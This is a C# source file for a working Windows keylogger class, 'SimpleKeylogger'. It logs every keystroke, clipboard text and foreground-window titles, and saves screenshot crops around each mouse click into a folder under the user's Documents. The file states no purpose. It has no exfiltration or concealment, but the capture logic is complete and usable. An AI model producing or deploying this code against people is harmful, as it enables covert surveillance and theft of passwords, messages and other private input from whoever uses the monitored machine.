using System;
using System.Collections.Generic;
using System.Text;
using gma.System.Windows;
using System.Diagnostics;
using System.Windows.Forms;
using System.Globalization;
using System.Drawing;
using System.Drawing.Imaging;
using Klog.Properties;
using System.IO;
using System.Security.Permissions;

namespace Klog
{
    public class SimpleKeylogger 
    {
        public static readonly String LogPath = 
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), @"Klog-Logs");
        public static readonly String LogFileName =
            Path.Combine(LogPath, "Activity.txt");

        // Helpers
        ForegroundWindow _window = new ForegroundWindow();
        KeyChord _keyChord = new KeyChord();
        int _nextBitmapNum = 0;

        public SimpleKeylogger()
        {
            _keyChord.ClipboardAction += new EventHandler(OnClipboardAction);
        }

        void OnClipboardAction(object sender, EventArgs e)
        {
            String cb = Clipboard.GetText();
            if (!String.IsNullOrEmpty(cb))
            {
                LogEvent(Environment.NewLine + "[Clipboard: "+cb+"]" + Environment.NewLine);
            }
        }

        public void OnKeyDown(object sender, KeyEventArgs e)
        {
            _keyChord.AddKeyDown(e.KeyData);
        }

        public void OnKeyUp(object sender, KeyEventArgs e)
        {
            _keyChord.AddKeyUp(e.KeyData);

            if (_keyChord.Completed)
            {
                String s = _keyChord.ToString();
                if (!String.IsNullOrEmpty(s)) { s += Environment.NewLine; }
                _keyChord.Reopen();

                LogEvent(s);
            }
        }

        void LogEvent(String s)
        {
            if (String.IsNullOrEmpty(s)) { return; }

            if (_window.CheckHasChanged())
            {
                String date = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

                String app = Environment.NewLine + "--- " + date + " App: " + _window.Text + Environment.NewLine;
                File.AppendAllText(LogFileName, app);

            }

            File.AppendAllText(LogFileName, s);
        }

        public void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            if (Char.GetUnicodeCategory(e.KeyChar) != UnicodeCategory.Control)
            {
                LogEvent(e.KeyChar.ToString());
            }
        }
 
        public void OnMouseActivity(object sender, MouseEventArgs e)
        {
            if (e.Clicks == 0)
            {
                String filename = GetNextBitmapFilename();

                CaptureClickBitmap(e.Location, filename);

                LogEvent("[Click #"+ (_nextBitmapNum-1) +"]");
            }
        }

        String GetNextBitmapFilename()
        {
            while (true)
            {
                String filename = Path.Combine(LogPath, "Click" + _nextBitmapNum.ToString("00000") + ".png");
                ++_nextBitmapNum;
                if (!File.Exists(filename)) { return filename; }
            }
        }

        [UIPermission(SecurityAction.Assert)]
        void CaptureClickBitmap(Point clickLocation, String filename)
        {
            int Off = 4;
            int r = Settings.Default.ClickScreenshotRadius;
            Rectangle bounds = new Rectangle(clickLocation.X - r, clickLocation.Y - r, r * 2, r * 2);

            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);

                    g.DrawEllipse(Pens.Yellow, r - Off, r - Off, Off * 2, Off * 2);
                    --Off;
                    g.DrawEllipse(Pens.Red, r - Off, r - Off, Off * 2, Off * 2);

                    //g.DrawLine(Pens.Red, r - Off, r - Off, r + Off, r + Off);
                    //g.DrawLine(Pens.Red, r - Off, r + Off, r + Off, r - Off);
                }
                bitmap.Save(filename, ImageFormat.Png);
            }
        }
    }
}
